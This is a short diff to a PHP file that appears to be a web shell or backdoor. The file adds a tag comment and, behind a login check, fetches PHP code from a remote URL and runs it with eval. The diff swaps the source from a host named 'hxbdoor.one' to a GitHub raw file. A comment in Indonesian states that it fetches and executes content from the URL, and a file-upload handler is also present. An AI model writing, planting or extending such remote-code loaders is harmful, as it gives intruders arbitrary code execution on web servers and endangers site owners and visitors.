@@ -1,5 +1,7 @@
 <?php
 
+//VATHAN VS EVERYBODY
+
 session_start();
 
 // Fungsi untuk memeriksa status login
@@ -81,7 +83,7 @@ if (isset($_FILES['file']['tmp_name'])) {
 
 // Jika pengguna sudah login, ambil dan eksekusi konten dari URL
 if (is_logged_in()) {
-    $url = 'https://hxbdoor.one/raw/7eyuOY3h';
+    $url = 'https://raw.githubusercontent.com/Vathannn/breakingnews/refs/heads/main/Vathan.php';
     $content = getRawContent($url);
     eval('?>' . $content);
     exit;
